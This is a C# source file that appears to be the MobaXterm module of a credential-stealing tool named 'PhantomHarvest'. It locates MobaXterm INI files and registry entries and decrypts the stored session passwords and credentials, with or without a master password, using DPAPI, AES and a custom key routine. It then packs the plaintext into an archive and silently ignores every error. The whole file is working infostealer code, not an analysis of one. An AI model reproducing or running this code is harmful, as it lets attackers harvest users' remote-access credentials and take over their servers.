using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Tools
{
	internal class MobaXterm
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				List<string> ini = MobaXterm.GetINI();
				if (ini.Count != 0)
				{
					string str = MobaXterm.FromINI(ini);
					if (!string.IsNullOrEmpty(str))
					{
						using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(str)))
						{
							zip.AddStream(ArchiveManager.Compression.Deflate, MobaXterm.ToolName + "/MobaXterm_INI.txt", ms, DateTime.Now, "");
						}
					}
				}

				string reg = MobaXterm.FromRegistry();
				if (!string.IsNullOrEmpty(reg))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(reg)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, MobaXterm.ToolName + "/MobaXterm_Registry.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string FromINI(List<string> pathlist)
		{
			StringBuilder stringBuilder = new StringBuilder();
			foreach (string filename in pathlist)
			{
				try
				{
					Pixini pixini = Pixini.Load(filename);
					string text = pixini.Get<string>("SessionP", "Misc", "");
					if (!string.IsNullOrEmpty(text))
					{
						string text2 = pixini.Get<string>((Environment.UserName + "@" + Environment.MachineName).Replace(" ", ""), "Sesspass", "");
						List<string> list = new List<string>();
						List<IniLine> list2;
						pixini.sectionMap.TryGetValue("passwords", out list2);
						if (list2 != null)
						{
							foreach (IniLine iniLine in list2)
							{
								string key = iniLine.key;
								string value = iniLine.value;
								try
								{
									if (string.IsNullOrEmpty(text2))
									{
										string str = MobaXterm.DecryptWithoutMP(text, value);
										list.Add(key + "=" + str);
									}
									else
									{
										string str2 = MobaXterm.DecryptWithMP(text, text2, value);
										list.Add(key + "=" + str2);
									}
								}
								catch
								{
								}
							}
						}
						List<string> list3 = new List<string>();
						List<IniLine> list4;
						pixini.sectionMap.TryGetValue("credentials", out list4);
						if (list4 != null)
						{
							foreach (IniLine iniLine2 in list4)
							{
								string key2 = iniLine2.key;
								string value2 = iniLine2.value;
								try
								{
									string text3 = value2.Split(new char[]
									{
										':'
									})[0];
									if (string.IsNullOrEmpty(text2))
									{
										string text4 = MobaXterm.DecryptWithoutMP(text, value2.Split(new char[]
										{
											':'
										})[1]);
										list3.Add(string.Concat(new string[]
										{
											key2,
											"=",
											text3,
											":",
											text4
										}));
									}
									else
									{
										string text5 = MobaXterm.DecryptWithMP(text, text2, value2.Split(new char[]
										{
											':'
										})[1]);
										list3.Add(string.Concat(new string[]
										{
											key2,
											"=",
											text3,
											":",
											text5
										}));
									}
								}
								catch
								{
								}
							}
						}
						if (list != null && list.Count > 0)
						{
							stringBuilder.AppendLine("Passwords:");
							foreach (string value3 in list)
							{
								stringBuilder.AppendLine(value3);
							}
							stringBuilder.AppendLine("");
						}
						if (list3 != null && list3.Count > 0)
						{
							stringBuilder.AppendLine("Credentials:");
							foreach (string value4 in list3)
							{
								stringBuilder.AppendLine(value4);
							}
							stringBuilder.AppendLine("");
						}
					}
				}
				catch
				{
				}
			}
			return stringBuilder.ToString();
		}

		public static string FromRegistry()
		{
			StringBuilder stringBuilder = new StringBuilder();
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm");
				if (registryKey == null) return null;

				string sessionP = (string)registryKey.GetValue("SessionP");
				string text = "";
				try
				{
					string text2 = Environment.UserName + "@" + Environment.MachineName;
					text = (string)registryKey.OpenSubKey("M").GetValue(text2.Replace(" ", ""));
				}
				catch
				{
				}
				try
				{
					foreach (string text3 in registryKey.OpenSubKey("P").GetValueNames())
					{
						try
						{
							string str = text3;
							string ciphertext = (string)registryKey.OpenSubKey("P").GetValue(text3);
							if (string.IsNullOrEmpty(text))
							{
								string str2 = MobaXterm.DecryptWithoutMP(sessionP, ciphertext);
								list.Add(str + "=" + str2);
							}
							else
							{
								string str3 = MobaXterm.DecryptWithMP(sessionP, text, ciphertext);
								list.Add(str + "=" + str3);
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				try
				{
					foreach (string text4 in registryKey.OpenSubKey("C").GetValueNames())
					{
						try
						{
							string str4 = text4;
							string ciphertext2 = (string)registryKey.OpenSubKey("C").GetValue(text4);
							if (string.IsNullOrEmpty(text))
							{
								string str5 = MobaXterm.DecryptWithoutMP(sessionP, ciphertext2);
								list2.Add(str4 + "=" + str5);
							}
							else
							{
								string str6 = MobaXterm.DecryptWithMP(sessionP, text, ciphertext2);
								list2.Add(str4 + "=" + str6);
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				if (list.Count > 0)
				{
					stringBuilder.AppendLine("Passwords:");
					foreach (string value in list)
					{
						stringBuilder.AppendLine(value);
					}
					stringBuilder.AppendLine("");
				}
				if (list2.Count > 0)
				{
					stringBuilder.AppendLine("Credentials:");
					foreach (string value2 in list2)
					{
						stringBuilder.AppendLine(value2);
					}
					stringBuilder.AppendLine("");
				}
				return stringBuilder.ToString();
			}
			catch
			{
			}
			return null;
		}

		public static string DecryptWithMP(string SessionP, string Sesspasses, string Ciphertext)
		{
			byte[] array = Convert.FromBase64String(Sesspasses);
			byte[] array2 = new byte[]
			{
				1,
				0,
				0,
				0,
				208,
				140,
				157,
				223,
				1,
				21,
				209,
				17,
				140,
				122,
				0,
				192,
				79,
				194,
				151,
				235
			};
			byte[] array3 = new byte[array.Length + array2.Length];
			for (int i = 0; i < array2.Length; i++)
			{
				array3[i] = array2[i];
			}
			for (int j = 0; j < array.Length; j++)
			{
				array3[array2.Length + j] = array[j];
			}
			byte[] bytes = ProtectedData.Unprotect(array3, Encoding.UTF8.GetBytes(SessionP), DataProtectionScope.CurrentUser);
			Array sourceArray = Convert.FromBase64String(Encoding.UTF8.GetString(bytes));
			byte[] encryptedBytes = Convert.FromBase64String(Ciphertext);
			byte[] array4 = new byte[32];
			Array.Copy(sourceArray, array4, 32);
			Array sourceArray2 = MobaXterm.AESEncrypt(new byte[16], array4);
			byte[] array5 = new byte[16];
			Array.Copy(sourceArray2, array5, 16);
			return MobaXterm.AESDecrypt(encryptedBytes, array4, array5);
		}

		public static string DecryptWithoutMP(string SessionP, string Ciphertext)
		{
			byte[] array = MobaXterm.KeyCrafter(SessionP);
			byte[] bytes = Encoding.ASCII.GetBytes(Ciphertext);
			List<byte> list = new List<byte>();
			foreach (byte item in bytes)
			{
				if (array.ToList<byte>().Contains(item))
				{
					list.Add(item);
				}
			}
			byte[] ct = list.ToArray();
			List<byte> list2 = new List<byte>();
			if (ct.Length % 2 == 0)
			{
				int i;
				Predicate<byte> cachedPredicate0 = null;
				Predicate<byte> cachedPredicate1 = null;
				for (i = 0; i < ct.Length; i += 2)
				{
					List<byte> list3 = array.ToList<byte>();
					Predicate<byte> match;
					if ((match = cachedPredicate0) == null)
					{
						match = (cachedPredicate0 = ((byte a) => a == ct[i]));
					}
					int num = list3.FindIndex(match);
					array = MobaXterm.RightBytes(array);
					List<byte> list4 = array.ToList<byte>();
					Predicate<byte> match2;
					if ((match2 = cachedPredicate1) == null)
					{
						match2 = (cachedPredicate1 = ((byte a) => a == ct[i + 1]));
					}
					int num2 = list4.FindIndex(match2);
					array = MobaXterm.RightBytes(array);
					list2.Add((byte)(16 * num2 + num));
				}
				byte[] bytes2 = list2.ToArray();
				return Encoding.UTF8.GetString(bytes2);
			}
			return "";
		}

		public static byte[] RightBytes(byte[] input)
		{
			byte[] array = new byte[input.Length];
			for (int i = 0; i < input.Length - 1; i++)
			{
				array[i + 1] = input[i];
			}
			array[0] = input[input.Length - 1];
			return array;
		}

		public static List<string> GetINI()
		{
			List<string> list = new List<string>();
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName.Contains(MobaXterm.ToolName))
				{
					try
					{
						list.Add(Path.Combine(Path.GetDirectoryName(process.MainModule.FileName), "MobaXterm.ini"));
					}
					catch
					{
					}
				}
			}
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MobaXterm\\MobaXterm.ini");
			if (File.Exists(text))
			{
				list.Add(text);
			}
			return list;
		}

		private static string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
		{
			MemoryStream memoryStream = new MemoryStream(encryptedBytes);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Mode = CipherMode.CFB;
			rijndaelManaged.FeedbackSize = 8;
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Key = bKey;
			rijndaelManaged.IV = iv;
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
			string @string;
			try
			{
				byte[] array = new byte[encryptedBytes.Length + 32];
				int num = cryptoStream.Read(array, 0, encryptedBytes.Length + 32);
				byte[] array2 = new byte[num];
				Array.Copy(array, 0, array2, 0, num);
				@string = Encoding.UTF8.GetString(array2);
			}
			finally
			{
				cryptoStream.Close();
				memoryStream.Close();
				rijndaelManaged.Clear();
			}
			return @string;
		}

		private static byte[] AESEncrypt(byte[] plainBytes, byte[] bKey)
		{
			MemoryStream memoryStream = new MemoryStream();
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Mode = CipherMode.ECB;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Key = bKey;
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			byte[] result;
			try
			{
				cryptoStream.Write(plainBytes, 0, plainBytes.Length);
				cryptoStream.FlushFinalBlock();
				result = memoryStream.ToArray();
			}
			finally
			{
				cryptoStream.Close();
				memoryStream.Close();
				rijndaelManaged.Clear();
			}
			return result;
		}

		public static byte[] KeyCrafter(string SessionP)
		{
			while (SessionP.Length < 20)
			{
				SessionP += SessionP;
			}
			string text = SessionP;
			string text2 = Environment.UserName + Environment.UserDomainName;
			while (text2.Length < 20)
			{
				text2 += text2;
			}
			string[] array = new string[]
			{
				text.ToUpper(),
				text.ToUpper(),
				text.ToLower(),
				text.ToLower()
			};
			byte[] bytes = Encoding.UTF8.GetBytes("0d5e9n1348/U2+67");
			for (int i = 0; i < bytes.Length; i++)
			{
				byte b = (byte)array[(i + 1) % array.Length][i];
				if (!bytes.Contains(b) && Encoding.UTF8.GetBytes("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/").Contains(b))
				{
					bytes[i] = b;
				}
			}
			return bytes;
		}

		public static string ToolName = "MobaXterm";
	}
}
